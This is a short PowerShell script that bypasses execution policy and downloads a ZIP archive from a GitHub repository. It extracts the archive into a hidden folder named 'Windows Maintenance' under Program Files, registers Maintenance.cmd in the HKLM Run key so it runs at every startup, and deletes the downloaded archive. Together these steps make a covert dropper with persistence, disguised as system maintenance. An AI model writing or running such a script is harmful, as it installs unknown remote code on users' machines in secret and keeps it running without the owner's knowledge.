# Set execution policy to bypass for the current session
Set-ExecutionPolicy Bypass -Scope Process -Force

$url = 'https://github.com/legiion/test1/raw/main/Windows%20Maintenance.zip'
$outputFolder = 'C:\Program Files\Windows Maintenance'
$outputFile = Join-Path -Path $outputFolder -ChildPath 'Windows%20Maintenance.zip'

# Create the output folder if it doesn't exist
New-Item -ItemType Directory -Path $outputFolder -Force | Out-Null

# Download the file
Invoke-WebRequest -Uri $url -OutFile $outputFile

# Extract the contents of the ZIP archive to the destination path
Expand-Archive -Path $outputFile -DestinationPath $outputFolder -Force

# Hide the "Windows Maintenance" folder
Set-ItemProperty -Path $outputFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Add a string value in the Windows Registry
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Maintenance" -Value "C:\Program Files\Windows Maintenance\Maintenance.cmd" -PropertyType String

# Remove the downloaded ZIP file
Remove-Item -Path $outputFile -Force